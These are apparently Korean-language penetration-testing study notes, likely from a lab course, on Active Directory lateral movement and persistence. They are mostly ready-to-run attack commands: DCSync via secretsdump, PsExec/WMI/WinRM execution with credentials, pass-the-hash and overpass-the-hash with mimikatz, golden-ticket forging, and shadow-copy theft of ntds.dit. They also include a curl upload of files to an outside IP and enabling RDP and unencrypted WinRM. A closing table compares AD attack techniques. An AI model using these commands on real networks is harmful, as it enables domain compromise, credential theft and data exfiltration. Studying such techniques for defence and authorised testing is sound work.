`impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`

# **Active Directory 측면 이동**

## **Active Directory 측면 이동 기술**

### **WMI 및 WinRM**

- wmic 명령어 (135 포트)

`wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"`

- winrs (5985 포트)

`winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"`

### PsExec

조건: Administrators 로컬 그룹, ADMIN$ 공유 사용 가능, 파일 및 프린터 공유 활성화 → 마지막 2개는 기본 활성화책

- PsExec를 사용하여 대상 시스템에서 대화형 셸 얻기

`.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd`

### Pass the Hash

- Impacket wmiexec를 사용하여 NTLM 해시 전달

`/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73`

### **Overpass the Hash**

- 다른 사용자의 NTLM 암호 해시를 사용하여 프로세스 만들기

`sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell`

- Kerberos를 사용하여 원격 연결 열기

`.\PsExec.exe \\files04 cmd`

### **Pass the Ticket**

- Kerberos TGT/TGS를 디스크로 내보내기

`privilege::debugsekurlsa::tickets /export`

- 선택된 TGS를 프로세스 메모리에 주입

`kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`

## **Active Directory 지속성**

### Golden Ticket

- Mimikatz를 사용하여 krbtgt 비밀번호 해시 덤프

`privilege::debuglsadump::lsa /patch`

- 기존 Kerberos 티켓 제거

`kerberos::purge`

- Mimikatz를 사용하여 골든 티켓 만들기
    - 실버 티켓과 달리 기존에 존재하는 계정을 제공

`kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt`

- PsExec를 사용하여 DC01에 엑세스

`PsExec.exe \\dc1 cmd.exe`

### **Shadow Copies**

- C: 드라이브 전체의 섀도 복사본 수행

`vshadow.exe -nw -p  C:`

- ntds 데이터베이스를 C: 드라이브에 복사

`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`

- SYSTEM 하이브 저장

`reg.exe save hklm\system c:\system.bak`

- kali에서 자격 증명 추출

`impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`

# Techniques

### python upload server

- upload server 실행

`pip3 install uploadserverpython3 -m uploadserver 8000`

- 파일 업로드

`curl.exe http://192.168.45.190:8080/upload -F files=@C:\Users\files.zip`

### 파일 메타데이터 읽기

- exiftool

`exiftool *.pdf | grep Author`

### winrm

- winrm 활성화

`winrm quickconfig -q -forcewinrm set winrm/config/service @{AllowUnencrypted="true"}winrm set winrm/config/service/auth @{Basic="true"}net start winrm`

### RDP

RDP 활성화

`*Evil-WinRM* PS C:\Users\o.foller\Documents> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /fThe operation completed successfully. *Evil-WinRM* PS C:\Users\o.foller\Documents> netsh advfirewall set rule group="remote desktop" new enable=YesThe following command was not found: advfirewall set rule "group=remote desktop" new enable=Yes.*Evil-WinRM* PS C:\Users\o.foller\Documents>*Evil-WinRM* PS C:\Users\o.foller\Documents> net localgroup "Remote Desktop Users" o.foller /addThe command completed successfully.`

# Active Directory 공격 기법 비교표

## Active Directory 공격 기법 요약

### **🔍 정찰 및 초기 접근**

**Password Spray**

- 여러 계정에 동일한 약한 비밀번호를 시도하여 초기 계정 탈취

### **🎯 자격증명 획득 (크랙 필요)**

**AS-REP Roasting**

- Kerberos 사전 인증이 꺼진 계정의 해시를 요청하여 오프라인 크랙

**Kerberoasting**

- SPN이 등록된 서비스 계정의 TGS 티켓을 요청하여 비밀번호 크랙

### **💀 자격증명 획득 (크랙 불필요)**

**DCSync**

- DC인 척 위장하여 도메인의 모든 계정 NTLM 해시를 복제

**Pass the Ticket (메모리 덤프)**

- 메모리에서 활성 Kerberos 티켓을 추출하여 재사용

### **🚀 자격증명 활용**

**Pass the Hash (NTLM 해시 필요)**

- 평문 비밀번호 없이 NTLM 해시만으로 즉시 인증

**Overpass the Hash (NTLM 해시 필요)**

- NTLM 해시로 Kerberos TGT를 요청하여 Kerberos 인증 우회

**Silver Ticket (NTLM 해시 필요)**

- 서비스 계정 해시로 가짜 서비스 티켓을 위조하여 특정 서비스 접근

**Golden Ticket (krbtgt 해시 필요)**

- krbtgt 해시로 도메인 관리자 TGT를 위조하여 영구 접근 권한 확보

|공격 기법|필요 권한|사전 조건|획득 결과|크랙 필요|주요 용도|
|---|---|---|---|---|---|
|**Password Spray**|없음 (외부 공격 가능)|사용자 목록|평문 비밀번호|❌|초기 침투|
|**AS-REP Roasting**|도메인 사용자|Pre-auth 비활성화된 계정 존재|Kerberos AS-REP 해시|✅ 필수|취약 계정 발견|
|**Kerberoasting**|도메인 사용자|SPN 등록된 서비스 계정 존재|Kerberos TGS 해시|✅ 필수|서비스 계정 탈취|
|**Silver Ticket**|없음|서비스 계정의 NTLM 해시 보유|위조된 서비스 티켓|❌|특정 서비스 접근|
|**DCSync**|Domain Admin 또는 복제 권한|고권한 계정 획득|모든 NTLM 해시|❌|전체 자격증명 덤프|
|**Pass the Hash**|없음|NTLM 해시 보유|인증 세션|❌|즉시 인증|
|**Overpass the Hash**|없음|NTLM 해시 보유|Kerberos TGT|❌|Kerberos 환경 접근|
|**Pass the Ticket**|로컬 관리자 (메모리 접근)|활성 Kerberos 세션 존재|추출한 티켓 재사용|❌|티켓 재활용|
|**Golden Ticket**|없음|krbtgt NTLM 해시 보유|위조된 TGT|❌|영구 도메인 접근|
